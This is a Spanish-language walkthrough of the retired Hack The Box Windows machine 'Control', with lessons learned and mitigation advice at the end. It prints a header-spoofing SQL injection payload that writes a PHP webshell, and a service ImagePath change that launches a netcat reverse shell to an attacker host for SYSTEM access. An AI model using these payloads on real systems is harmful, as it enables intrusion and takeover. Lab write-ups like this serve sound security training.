---
machine: Control
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, web, iis, sqli, mysql, services, privesc]
---

# Control — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

`admin.php` confía en `X-Forwarded-For` para autorizar y después concatena `productName` en SQL. Un UNION con privilegio `FILE` escribe un webshell en IIS, y los hashes de MySQL permiten pasar a `hector`. La escalada modifica la ruta de un servicio que cualquier usuario autenticado puede iniciar.

## Reconocimiento

```bash
nmap -Pn -sCV -p80,135,3306 <IP>
```

- `80/tcp` IIS 10 con una web corporativa y `admin.php` protegido.
- `135/tcp` RPC y `3306/tcp` MariaDB, que rechaza conexiones externas.
- El código fuente incluye un comentario con la IP interna `192.168.4.28`.

## Enumeración

- Añadir `X-Forwarded-For: 192.168.4.28` devuelve `admin.php` en lugar del error de proxy.
- `productName=Asus'` genera un error SQL; un `UNION SELECT` de seis columnas devuelve datos.
- El usuario `manager` tiene privilegio `FILE`, suficiente para escribir en `C:/inetpub/wwwroot`.

## Foothold

Se escribe un webshell PHP con `INTO OUTFILE` y se ejecuta como `nt authority\iusr`.

```bash
curl -H 'X-Forwarded-For: 192.168.4.28'   --data-urlencode "productName=Asus' UNION SELECT '<?php system($_GET[cmd]); ?>',2,3,4,5,6 INTO OUTFILE 'c:/inetpub/wwwroot/_x.php'#"   http://<IP>/admin.php
curl 'http://<IP>/_x.php?cmd=whoami'
```

## Movimiento lateral

Se vuelcan los hashes de `mysql.user` y se crackea el de `hector`. `hector` pertenece a Remote Management Users, así que se usa `Invoke-Command` para ejecutar comandos como él y obtener una shell por WinRM o Netcat.

## Escalada de privilegios

Cualquier usuario autenticado puede escribir claves de servicio. Se buscan servicios con `RP` para `AU` en el SDDL y `ObjectName=LocalSystem`, se reemplaza `ImagePath` por Netcat y se inicia el servicio.

```powershell
sc sdshow <SERVICE>
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\<SERVICE> -Name ImagePath -Value "C:\Windows\Temp\nc.exe -e cmd <ATTACKER> 443"
Start-Service <SERVICE>
```

## Evidencia

- `admin.php` accesible con `X-Forwarded-For`.
- Webshell como `iusr` y hash de `hector` crackeado.
- Servicio con `ImagePath` modificado y shell como SYSTEM.

## Lecciones aprendidas

- Un header HTTP no es un mecanismo de autenticación.
- El privilegio `FILE` convierte una SQLi en ejecución web.
- Permisos de escritura en claves de servicio permiten movimiento lateral y SYSTEM.

## Mitigación y detección

- No confiar en `X-Forwarded-For`; usar autenticación real y un proxy de confianza.
- Usar consultas parametrizadas y revocar `FILE` al usuario de la aplicación.
- Restringir la escritura en `HKLM\SYSTEM\CurrentControlSet\Services` y auditar cambios de `ImagePath`.

## Referencias

- [0xdf — Control](https://0xdf.gitlab.io/2020/04/25/htb-control.html)
- [IppSec — Control](https://www.youtube.com/watch?v=kFfYHmLmwVc)
- [Hack The Box — Control](https://app.hackthebox.com/machines/control)
